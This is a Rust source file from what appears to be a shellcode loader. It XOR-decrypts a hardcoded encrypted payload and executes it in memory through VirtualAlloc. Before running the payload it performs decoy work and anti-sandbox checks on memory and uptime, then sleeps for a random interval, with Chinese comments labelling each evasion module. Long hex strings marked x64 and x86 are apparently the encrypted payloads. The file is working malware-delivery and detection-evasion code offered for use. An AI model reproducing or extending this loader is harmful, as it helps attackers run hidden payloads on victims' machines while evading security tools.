use crate::toolbox::sleep::random_sleep;
use crate::loader::heapapi_healdlloc::heapapi_healdlloc_execute_shellcode;
use crate::loader::winapi_virtualalloc::winapi_virtualalloc_execute_shellcode;
use crate::encryption::rc4::*;
use crate::toolbox::sandbox_check::sandbox_check_memory;
use crate::toolbox::sandbox_check::sandbox_check_uptime;
use crate::toolbox::bubble_sort::bubble_sort;
use crate::toolbox::midnight_maze::midnight_maze;
use crate::toolbox::request_check::request_check;
use crate::encryption::xor_random::{add_random, rm_random, xor_decrypt, xor_encrypt};

fn str_to_u8array(str : &str) -> Vec<u8> {

    let hex_string = str.replace("\\x", "");
    let bytes = hex::decode(hex_string).unwrap();
    let result = bytes.as_slice();
    // println!("{:?}", result);
    result.to_vec()
}

fn encryption(shellcode:&[u8],key: &str){

    let encrypted =xor_encrypt(shellcode,key.as_bytes());
    // println!("\n{}", encrypted0);

    let random_string = add_random(encrypted.as_str(), key);
    println!("xor_encrypted_random_string:\n{}", random_string);
}

fn decryption(random_string:&str,key:&str)-> Vec<u8>{

    let encrypted = rm_random(random_string);
    // println!("\n{:?}", encrypted);

    let shellcode = xor_decrypt(encrypted.as_slice(),key.as_bytes());
    // println!("shellcode:{:?}", shellcode);
    shellcode
}

fn run_config(){
    // 迷惑行为 @1 冒泡排序 参数为参与的冒泡数量
    bubble_sort(13);

    // 午夜迷宫 @1 仅在特定小时特定分钟可用 参数分别为小时、分钟
    // midnight_maze(13,49);

    // 迷惑行为 @2 模拟请求，此处模拟windows系统更新
    // request_check("http://windowsupdate.microsoft.com");

    // 反沙箱模块 @1 内存检测 参数为最小内存要求
    sandbox_check_memory(3);

    // 反沙箱模块 @2 开机时间检测 参数为最小开机时间要求，单位为分钟
    sandbox_check_uptime(10);

    // 反沙箱模块 @3 随机延时 两个参数分别为最小值最大值
    random_sleep(3,13);
}

fn cs_run(random_string:&str,key:&str){
    let encrypted = rm_random(random_string);
    // println!("{:?}", encrypted);

    let shellcode = xor_decrypt(encrypted.as_slice(),key.as_bytes());
    println!("shellcode:{:?}", shellcode);
}

pub(crate) fn plana_create(key:&str,shellcode:&[u8]) {
    // let key = "GjYFUYUFD3425df798GCKnx";
    // let shellcode = &[0xfc,0x48];
    // let shellcode = include_bytes!("..\\..\\payload_x64_0712.bin");
    print!("shellcode:\n{:?}\n",shellcode);
    encryption(shellcode,key);
}

pub(crate) fn plana_run(key:&str,xor_encrypted_random_string:&str) {
    // let key = "GjYFUYUFD3425df798GCKnx";

    // let xor_encrypted_random_string="6247626a3247324b";
    // x64
    // let xor_encrypted_random_string ="6247626a325932466455615961553246614435336234313239356464346636373439343833473343374b356e36783347376a345933463455335934553646364436336634373230353764366639373139323865473243364b666e33783147356a305961463155315963556446304437333434313231356464636664373139363831473343374b636e62783947346a375933463455325965553346384438336534373232353064646630376539373861476143374b336e30783747366a615961466655355937556146334434333234353235353764366661373639343837473243664b356e66786247336a385932463555365937556646364464336234643235353164356630373239313861473243364b666e33783147356a345961466455325930553446364439333134313235353464396636373239323862473243344b636e32786147336a655936463655315933553446354462333234623238356364666634373339343862473643654b336e30786347326a615961463255645932553146314464333534383238353564316636376339663837476243324b636e37783647626a655932463455345936553746654433333834653238356164346631373539303833473943314b626e31783047366a655931463655645963556546314464333534383238353364306662373739353866476143374b636e30783347666a355963463855325937556646364466333034333235353064366634373239383861473543364b396e38783347326a395962463155355934553546314439333734643235356464306633373739643865473243344b316e65786147366a645932463055655964553746374431336434373231353464366639373339323864473243664b666e33783447626a325932463155645963556446314435333434353231356364346637373939343837473243624b666e33783647626a645932466355365937556546374437333834363230353064366631376239313835473343374b326e32783047366a335932463155385931556646314434333034333231356464636635376139383831473343374b356e36783047636a615938463455335965553746364436333034363232353064666663373839353839473843374b336e37786247386a395935466155365931556246334466333534393231356364666638373339333835476143354b616e35786247356a625930463155315932553346374437333834363265353064656663376139613864473243324b666e31786247366a325962466555335930556146324432333734663235353264626639373939313837476243304b356e66786247376a645935463555625934553746614430333834663238353064616637373239383832473243664b326e38783047366a335961463155385966556346364466333034663232356364656631376239623865473643644b666e34783147366a665932466355655966556646364437333834383230353664376661376639343862473643654b336e35783747366a615933463155385931553746314434333034383233356664346635373039353836473243374b356e38783847366a325965466455665939556646314463333634653264356164636631376139313830473243364b666e31783847366a325932463655385939553446314463336434303238356464306662373739353866476143364b366e35786147336a355936463655325936556246334436336234363261353064366666373939613830473343624b356e36783747636a395935463855635930556546644463333934663231356464636635373839373836473343354b656e33783847366a615932466355655966556346364437333134623231353964646630376139383863476143654b386e37786247386a395935466155365930556246364434333934303230353764316634373039353838473943314b396e33783447326a645931466655395939556546324462336334663238353464386663373639643836473643664b376e38783447376a325932466155365938553946354461336434643264353964346637373439343833473343644b666e65783147646a635938463055365937553346374433333934643230356564356662376339623834473943314b356e37783147356a315961463355615934553646374438336234623238356264316638376239613863473443624b626e36783647626a355962463455345964553546364466333434663266356564326635376639303837473343364b316e36786347326a375933466555375961553946364432336534343237356464646637376139373861476243344b346e36786547666a645963463455625935556246304430333534653236353364616634373239303865473443394b666e31783847636a615963463855375930556546354462333934363232356664386638373939373839473743384b346e62783247316a335930466355655964556646364439336334363239353564336665373439643831473543394b386e66786547616a645961463355365965553246664437333334643237356164646662376439313833473343374b356e35783147356a365930463155315936553446334430333334313238353664646636376339363831473643334b376e32783147326a315939463355635933553446374438333134383233353264326633373239613834473743304b656e31783247376a385930466255315963553546654435333534353234353264366636376339373865473443304b346e38783647376a345932463055655932556646334462333334643233356164336631373339373831473343374b616e36783647316a355935463255345938553046364431333034313238353064366633373339333862473043324b316e64783147306a305966463355625930556446334463333234643237356164376633373739373830473443314b616e30783147306a335934463455345965553746634437333134363263353064616630376639363837473443654b316e34783247656a305931463355635936553646314432333334633233353664326664373239623831476143334b396e33783847336a355932466255665964556446624434336434643237353864356662373639333863473743354b386e36786447306a335939466355375935553546384461333034343237356464396633376239643830476443644b616e32783447346a375932463755645963553646654430336234613263356564646664373539333836476143654b316e33783747386a395961463055305964553846664434336234363264356564346662373539353830473043314b356e39786447306a325965466655625964553146364431333934663266356164336664373439333865473043324b306e37786647626a665930466555385964553146304432333634343266356564316664376439303865473643324b636e62786447396a615933466655315930553746344435333234303234353664386664373339613864473543364b636e38786347386a385961466355375939553846644430333334373266356664336662373039663832476143314b386e61786447326a625965466655345966553246664464333734393239356564636639376539353830473943354b396e33783947306a325934466155625961553046614437333734353235353164666630373939373835473043664b376e31786547316a395964466255385963553946664435333434653266356464396665376439363862473443394b356e61786447656a625931463555355937556146654461336234643238353464386663376139393861473143654b666e37783847636a665961463755615962556146614461333634313230353964646661376539363836473443634b666e37783647396a345930463055615963556146624465333434313263353564666662376239333839476343664b626e63783047386a635934463555375932553346394436333434323231356164306636373839653866476243364b396e39786147656a635937463055365966556246334434333134343232353964646632376539373862473643304b376e65786247666a345936463055385939556346344466333034383263353964356661373739623830476243324b346e37783047316a315963463255655964553646304462333934663230356464356631373839613838473043384b306e38783547396a335937463655365936553746364438333734633238356664326665373139313864473943314b616e64783047666a355962463955305966556346354435333534393231353564346636373039353838476243334b346e32783247336a355936463455325937553846654437333934333238353464376634373339303861476443344b326e30786547336a335939466255635962553946384430333134313263353664316635373139373837476243624b646e64783547376a645965466455395937553746664462333034653232353064366666376239343862473443654b376e38783447376a325933466455305962556646314434336534333234353764646630376339643864473143634b626e65783747376a645965463755615932553146374462336334663238353364336666373539323864476543354b376e66783047666a365962463955615963553346394435333234633238353264316665373139633836476243374b636e33783747336a355936463455365936553346374436333934663262356164666664376339623836473943314b386e37783747366a355962463655655936553846364430333634393237356264376637373739333830476243314b616e30783347306a6359354633553659365530466444653337343532303566643666";
    // X86
    // let xor_encrypted_random_string ="6247626a3847324b634b65793459625534466237373739383356393564566368617633763068366a65683573356463376439643836473743364b366e65783347326a3447374b614b65793359335538463737633766383856313536563168667633763668386a66683073646436373539373861473943314b346e39783847376a6347364b374b62793259615533463737373762383756353537563568387637766668386a33686173336439373939313864473743614b366e33786147326a3147664b644b33796159375561466537333733383156353538563368367665763968626a33683073376433376239633865476143654b306e63783047646a3647624b394b37793159625563463037333731383456313564566568317665763168376a33683673656462376239353830473943314b666e65783347346a3247664b644b36793959625563463537393738386356353535566668377639763568666a39683873386434376539343861476143394b346e30786147376a3147664b624b33793459385533463637383731383656323532563868367632763468326a64683573366430376439643836476443374b326e36783947616a3547314b304b65793359365536463237333766383856333563563268627633763868656a62686373636434373739633830473643664b616e38786347656a3247654b364b33793659665531463037323732383356383530566368317663763668366a63683873646438373039653836476143304b636e65783347366a3447394b644b65796559335537463037303731386456303531563468337633763968356a30683373306432376139323835473043374b326e63783247666a3247364b334b30793659645534466337383736383856633536563468627639763668306a36683073366466373039313836473243334b656e35783247326a3047304b664b63796659395535466237643739386156653530563368377633763968336a38683173636437373239383832473343664b326e39783247646a3647394b314b36793159615532463337353739386256353535563568347636763668346a36683773356430373039313862476343634b396e61786547386a3947614b334b38793359315561463337333734383256623536563668357635763168336a38683473356430373339633866473343634b326e61783147356a3347394b314b35793159625532463337393732383056633537566268377664766368386a65683273626431373939303862473643394b356e33783847346a3747384b394b33796659335564463037323738386356333537563668317635763168316a35683473316435376239333830473943314b616e64786347326a6147614b344b38796359665538463837373738383556393535563568377637766368386a62683273636465373239323833473143644b666e39783147396a6447374b664b30793059635530466137643739383156333539566368387665766368626a31683873366432376239303865473443664b326e36783747366a3947354b394b32793759615562463437323765383356333535563268317637763668316a36683773356430376539313836473243624b366e36783347386a3947614b334b64793759365561463437373737383356363534563068657666766568346a63686673306437373239623834473843374b656e39783447366a3647614b344b37796159325538463237373738383556393535563568617665766268636a63683873636437376139393831476143324b346e31783847316a3547374b364b33796559395532463237613731386456663562563668337634763168376a34683273386438373339363833473643394b306e64786347316a3047664b624b30793559655534466537363734383956653537563068337637763568626a35686273376466373739323861473743664b386e62783947616a3247314b394b30796259625536463737663737383656383538563068397666763068346a37683973356465373839303835473443324b326e61786247346a3147314b364b33793859325536463137623763386256663533566668657666763868386a62683973366436373539643866473143644b366e64783547636a6647304b314b36793959365530466337363737383356383531563668377632763768356a62686673336436373739363864473343624b376e38783047366a3047394b324b34793259655533466237303764383656333537563568367663763168386a31686473336435373539633836473043324b356e30786447306a3447354b624b32793959305564463037643731386456313530563068647631763968376a35683273386433373939323832473043324b316e34783247366a3447354b374b32793659355537466237353739383756313530563268327666763568396a35683373356437373239313834473643374b366e32783647326a3247354b364b35796559345534463537393735386156343534563768367634763968346a38683273626432373639313863473043624b316e61783047636a3047334b334b33793659345537466537343761383656653537566268377635763068316a31683773316430373139643837476443304b326e32783547336a6147354b614b34793859305536463037313731383856303531563168377637766568356a64683273346432373839323834473443374b376e35783447646a3647614b354b34793559355539463737653764383256373562566668347666763968356a33686573336466373239363837473143354b626e33786347346a3547654b394b36796459345563463137393731386156653533563768357634763368396a62686173666436373239613830473543314b346e38783447646a6247624b654b31796659305536463237323731386256363562566468327638763568306a37683973666436373939313839473943314b616e63783147316a3947664b304b31796359305533463637383730383956633535563168357665763168626a37683873376437373139363832473143374b656e39783847356a6547304b354b31796659655534463337663766383856373530563368387636766468336a33683273626430376339313865473843344b626e30786647646a3547364b634b65793459665564466237313761383056313534566468317637763968386a33686573306431373139633836473343654b396e39783247626a6247384b634b61793559335531463737653763383256633532563568387634763068656a33686373386432373139373861476443354b366e39783847626a6147304b634b30796659375530466337353734386356383565566468647636766568346a33686573616464373539613837473843344b316e61783847376a6247334b614b66793559385565463037613736386656363537566668667665763368646a65686673656435373739373837476643374b306e32783647396a3447344b324b62793259305539466637383733386456343537563168627662763268346a36683373326437373039303866476443304b396e34786147616a6647384b314b33796659665534463837353734383156663564563068357637763568326a39683573396463376539663865473543624b366e66783747316a3747364b314b38793559655533466437333734383056313531566268327632766668396a36686273346432376639663838476143614b326e37783947336a6247324b644b64793059315538463237643735383856393564563168627630763168346a62683473306432373239363862476243634b616e33786347346a3347384b624b61793159615534466137383765383556623530566168367633763968356a30686273376466373639653839473343384b386e37783947326a3047304b304b37793259335534466237363739383556393535563568327665763368376a33683773376438373539363836473243334b656e33783047646a3247324b354b38796459395535466237643765383056643564563368377633763968336a38683473376434373239393832473343664b326e62786347656a3847644b314b30793259335534466237353739383556393535563568317635763668316a35686673326461376339303862476343624b346e39783747616a3347664b334b61793859315565466137653766383856363533563368367666766168626a64683873376433373639613865473343364b626e62786147666a6347334b624b61796259345562463437343738383656383536563268367638763068326a30683773316436373639373830473243364b656e34783647346a3747344b664b357966593655614635373237613864563035635638683676";
    run_config();

    let shellcode=decryption(xor_encrypted_random_string,key);

    winapi_virtualalloc_execute_shellcode(shellcode);
}
